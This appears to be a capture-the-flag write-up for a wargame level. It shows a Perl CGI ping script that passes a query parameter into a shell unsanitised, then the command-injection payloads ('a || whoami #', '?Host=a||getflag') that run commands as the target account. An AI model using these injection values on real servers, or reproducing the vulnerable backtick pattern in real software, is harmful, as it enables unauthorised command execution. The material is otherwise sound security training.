# level07

## Challenge Info
The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

## Solution

First i tried to execute arbitrary code through the param "host", and i successfully did it but it executed as level07 (we want flag07) which does not provided anything usefull

tried the following
```
./index.cgi Host="a || whoami #"
(...)
unknown host a
level07
```

Now, and since this a web application, accessing it from the browser should also be possible, but the port is unknown yet.

checking the thttpd.conf file we can see that it runs on port 7007 and that, after initialization, it executes the commands as <b>flag07</b> which is what we want. 

```
http://192.168.1.142:7007/index.cgi?Host=a||whoami

result: flag07

```

## Flag

```
http://192.168.1.142:7007/index.cgi?Host=a||getflag

result: You have successfully executed getflag on a target account
```